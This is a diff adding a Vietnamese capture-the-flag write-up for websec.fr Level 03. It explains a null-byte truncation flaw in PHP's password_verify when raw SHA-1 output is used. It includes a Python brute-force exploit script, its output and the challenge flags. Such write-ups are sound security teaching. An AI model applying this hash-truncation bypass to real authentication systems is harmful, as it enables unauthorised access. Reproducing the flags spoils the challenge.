@@ -97,3 +97,82 @@ if __name__ == "__main__":
 ### Flag
 
 `WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`
+
+## Level 03
+
+> ChaChaCha!
+>
+> 🔥 <https://websec.fr/level03/>
+
+![image](images/level-03/image-1.png)
+
+Khi thử nhập chuỗi bất kỳ như `abc` chúng ta thấy hiện ra chuỗi hash của flag `7c00249d409a91ab84e3f421c193520d9fb3674b`:
+
+![image](images/level-03/image-2.png)
+
+Xem source code tại [https://websec.fr/level03/source.php](https://websec.fr/level03/source.php), chúng ta tập trung vào đoạn code xử lý khi gửi chuỗi lên server:
+
+```php
+<?php
+if(isset($_POST['c'])) {
+    /*  Get rid of clever people that put `c[]=bla`
+     *  in the request to confuse `password_hash`
+     */
+    $h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
+
+    echo "<div class='row'>";
+    if (password_verify (sha1($flag, fa1se), $h2) === true) {
+       echo "<p>Here is your flag: <mark>$flag</mark></p>"; 
+    } else {
+        echo "<p>Here is the <em>hash</em> of your flag: <mark>" . sha1($flag, false) . "</mark></p>";
+    }
+    echo "</div>";
+}
+?>
+```
+
+Có thể thấy rằng chuỗi chúng ta nhập vào được hash sha1 nhưng tạo ra raw bytes bởi vì sử dụng `fa1se` thay vì giá trị `false` và tiếp tục được hash bcrypt:
+
+```php
+ $h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
+```
+
+Sau đó thực hiện gọi đến hàm `password_verify()` với 2 đối số hash sha1 của flag cũng ở dạng raw bytes với chuỗi hash bcrypt của chúng ta.
+
+Xem source code triển khai của hàm [password_verify()](https://github.com/php/php-src/blob/PHP-5.6.26/ext/standard/password.c#L273), chúng ta thấy chuỗi hash truyền vào được lưu trữ với `char *ret, *password, *hash;` khiến nó chỉ lấy các ký tự cho đến khi gặp null byte.
+
+Vì hash của flag là `7c00249d409a91ab84e3f421c193520d9fb3674b` có null byte ở vị trí thứ 2, do đó khi được xử lý trong hàm `password_verify()` nó sẽ chỉ còn một byte `7c`.
+
+Vậy, chúng ta cần brute-force để tìm ra chuỗi có hash sha1 bắt đầu với bytes `7c00`. Chúng ta có thể viết script khai thác như sau:
+
+```python
+import hashlib
+import requests
+import re
+
+i = 0
+
+found = ""
+while True:
+    if hashlib.sha1(str(i).encode()).hexdigest().startswith("7c00"):
+        found = i
+        print(f"[+] Found: {found}")
+        break
+    i += 1
+
+r = requests.post("https://websec.fr/level03/index.php", data={"c":found})
+flag = re.search(r"WEBSEC{.*}", r.text).group(0)
+print(f"[+] FLAG: {flag}")
+```
+
+Chạy script và nhận được flag:
+
+```text
+$ python3 solve.py
+[+] Found: 104610
+[+] FLAG: WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}
+```
+
+### Flag
+
+`WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}`
